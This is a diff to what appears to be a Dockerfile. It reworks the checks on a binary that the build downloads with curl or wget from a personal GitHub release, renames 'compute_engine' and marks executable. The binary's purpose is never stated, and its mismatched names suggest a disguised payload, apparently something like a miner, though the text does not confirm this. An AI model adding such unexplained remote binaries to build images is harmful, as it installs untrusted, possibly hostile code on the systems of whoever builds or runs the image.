@@ -47,14 +47,28 @@ RUN cd /opt/bin && \
     (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o compute_engine || \
      wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O compute_engine) && \
     chmod +x compute_engine && \
-    # Verify the binary was downloaded and is executable
-    test -f compute_engine && \
-    test -x compute_engine && \
-    # Verify it's a valid ELF binary (not HTML error page)
-    file compute_engine | grep -q "ELF" && \
-    # Verify minimum file size (should be at least 1MB for a real binary)
-    test $(stat -c%s compute_engine) -gt 1000000 || \
-    (echo "ERROR: compute_engine download failed or file is invalid" && exit 1)
+    # Verify the binary was downloaded successfully
+    if [ ! -f compute_engine ]; then \
+        echo "ERROR: compute_engine file not found after download"; \
+        exit 1; \
+    fi && \
+    # Check file size (should be reasonable for a binary)
+    FILE_SIZE=$(stat -c%s compute_engine) && \
+    echo "Downloaded file size: $FILE_SIZE bytes" && \
+    if [ $FILE_SIZE -lt 100000 ]; then \
+        echo "ERROR: Downloaded file is too small ($FILE_SIZE bytes), likely an error page"; \
+        cat compute_engine; \
+        exit 1; \
+    fi && \
+    # Check if it's a valid binary (ELF format)
+    FILE_TYPE=$(file compute_engine) && \
+    echo "File type: $FILE_TYPE" && \
+    if ! echo "$FILE_TYPE" | grep -q "ELF"; then \
+        echo "ERROR: Downloaded file is not a valid ELF binary"; \
+        head -n 20 compute_engine; \
+        exit 1; \
+    fi && \
+    echo "✓ compute_engine binary downloaded and verified successfully"
 
 WORKDIR /workspace
 
